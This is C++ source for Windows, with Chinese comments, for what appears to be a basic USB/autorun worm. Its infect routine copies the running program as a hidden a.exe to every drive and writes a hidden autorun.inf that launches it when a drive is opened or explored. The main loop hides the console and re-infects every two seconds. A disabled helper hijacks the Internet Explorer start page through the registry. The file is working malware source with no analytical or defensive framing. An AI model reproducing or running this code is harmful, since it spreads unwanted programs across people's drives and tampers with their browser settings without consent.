#include <windows.h>
#include<iostream>
#include<time.h>
#include<bits/stdc++.h>
using namespace std;

void CreateStringReg(HKEY hRoot,char *szSubKey,char* ValreName,char *Data) //用于修改字符串类型键值
{
    HKEY hKey;
    cout<<"in"<<endl;


    long lRet=RegCreateKeyEx(hRoot,szSubKey,0,NULL,
                             REG_OPTION_NON_VOLATILE,KEY_ALL_ACCESS,NULL,&hKey,NULL);
    //打开注册表键，不存在则创建它
    if(lRet!=ERROR_SUCCESS)
    {
        printf("error no RegCreateKeyEx %s\n",szSubKey);
        return ;
    }
    lRet=RegSetValueEx(hKey,ValreName,0,REG_SZ,(BYTE*)Data,strlen(Data));//修改注册表键值，没有则创建它
    if(lRet!=ERROR_SUCCESS)
    {
        printf("error no RegSetValreEx %s\n",ValreName);
        return ;
    }
    RegCloseKey(hKey);

}


void change()
{
    char StartPage[255]="http://www.sina.com/"; //要修改成的网址
    CreateStringReg(HKEY_CURRENT_USER,"Software\\Microsoft\\Internet Explorer\\Main","Start Page",StartPage);//调用修改字符串类型键值的函数

}

void infect(char* pstrFilePath)
{
    char strDriveStrings[MAXBYTE] = {0};
    DWORD dwDriveCount = GetLogicalDriveStringsA(MAXBYTE,strDriveStrings);
    for(int i = 0; i < dwDriveCount; i+=4)
    {
        char tagetPath[MAX_PATH] = {0};
        strncpy(tagetPath,&strDriveStrings[i],4);
        strcat(tagetPath,"a.exe");
        CopyFileA(pstrFilePath,tagetPath,false);
        SetFileAttributesA(tagetPath,FILE_ATTRIBUTE_HIDDEN);

        cout<<tagetPath<<endl;

        strncpy(tagetPath,&strDriveStrings[i],4);
        strcat(tagetPath,"autorun.inf");
        HANDLE hFile = CreateFileA(tagetPath,GENERIC_WRITE,0,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_HIDDEN,NULL);
        DWORD dwLen = 0;

        char* autoRun = "[autorun]\
\r\nopen=a.exe\
\r\nshell\\open=打开(&O)\
\r\nshell\\open\\Command=a.exe\
\r\nshell\\explore=资源管理器(&X)\
\r\nshell\\explore\\Command=a.exe\
\r\nshellexecute=a.exe";
        WriteFile(hFile,autoRun,strlen(autoRun),&dwLen,NULL);

        CloseHandle(hFile);
        SetFileAttributes(tagetPath, FILE_ATTRIBUTE_HIDDEN );       //设定为隐藏




    }
  //  change();
}





#pragma comment(linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"")
int main()
{

    while(1)
    {

        char strSelfPath[MAX_PATH] = {0};
        GetModuleFileName(NULL,strSelfPath,MAX_PATH);
        infect(strSelfPath);
        MessageBoxA(NULL,"????","提示",MB_OK);
        clock_t t1 = clock();
        clock_t t2 = clock();
        while(1)
        {
            double time = (double)(t2 - t1) / CLOCKS_PER_SEC;
            if(time>2)
            {
                break;
            }
            else
            {
                t2=clock();
            }
        }


    }
    return 0;
}
